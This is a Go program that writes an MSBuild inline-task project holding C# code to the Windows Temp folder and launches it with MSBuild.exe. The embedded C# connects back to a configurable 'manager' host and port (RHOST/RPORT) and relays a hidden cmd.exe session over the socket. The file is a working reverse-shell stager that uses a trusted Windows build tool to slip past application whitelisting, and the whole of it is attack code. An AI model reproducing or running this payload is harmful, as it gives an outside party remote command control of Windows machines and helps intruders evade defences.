package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

var tdu, msbuildpath string

//MANAGERIP connection string to the manager
const MANAGERIP = "RHOST"

//REMOTEPORT to connect to the manager
const REMOTEPORT = "RPORT"

func init() {
	tdu = `<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
<Target Name="tdu">
<tdu/>
</Target>
<UsingTask
    TaskName="tdu"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
      <Task>
      
      <Reference Include="System.Management.Automation" />
        <Code Type="Class" Language="cs">
         <![CDATA[
            using System;
            using System.Diagnostics;
            using System.IO;
            using System.Net.Sockets;
            using System.Text;
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;
            using System.Collections.ObjectModel;
            public class tdu : Task, ITask
            {
                public static StreamWriter streamWriter;
                 public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
                 {
                        StringBuilder strOutput = new StringBuilder();
                        if (!String.IsNullOrEmpty(outLine.Data))
                        {
                            try
                            {
                                strOutput.Append(outLine.Data);
                                streamWriter.WriteLine(strOutput);
                                streamWriter.Flush();
                            }
                            catch (Exception ex) { throw ex; }
                        }
                 }
                 public override bool Execute()
                 {
                     using (TcpClient client = new TcpClient("IP", PORT))
                        {
                            using (Stream stream = client.GetStream())
                            {
                                using (StreamReader rdr = new StreamReader(stream))
                                {
                                    streamWriter = new StreamWriter(stream);
                                    StringBuilder strInput = new StringBuilder();
                                    Process p = new Process();
                                    p.StartInfo.FileName = "cmd.exe";
                                    p.StartInfo.CreateNoWindow = true;
                                    p.StartInfo.UseShellExecute = false;
                                    p.StartInfo.RedirectStandardOutput = true;
                                    p.StartInfo.RedirectStandardInput = true;
                                    p.StartInfo.RedirectStandardError = true;
                                    p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                                    p.Start();
                                    p.BeginOutputReadLine();
                                    while (true)
                                    {
                                        strInput.Append(rdr.ReadLine());
                                        p.StandardInput.WriteLine(strInput);
                                        strInput.Remove(0, strInput.Length);
                                    }
                                }
                            }
                        }
                 }
            
            }
         ]]>
        </Code>      
      </Task>
</UsingTask>
</Project>`
	msbuildpath = `C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe`
}

func checkerr(err error) {
	if err != nil {

		fmt.Println(err)
	}
}

func main() {
	createmsbuildtemplate(MANAGERIP, REMOTEPORT)
	msbuild := exec.Command(msbuildpath, `C:/Windows/Temp/tdu.xml`)
	err := msbuild.Start()
	checkerr(err)

}

func createmsbuildtemplate(ip, port string) {
	ipreplaced := strings.Replace(tdu, "IP", ip, 1)
	portreplaced := strings.Replace(ipreplaced, "PORT", port, 1)
	fotduxml, err := os.Create(`C:/Windows/Temp/tdu.xml`)
	checkerr(err)
	defer fotduxml.Close()
	fotduxml.WriteString(portreplaced)
}
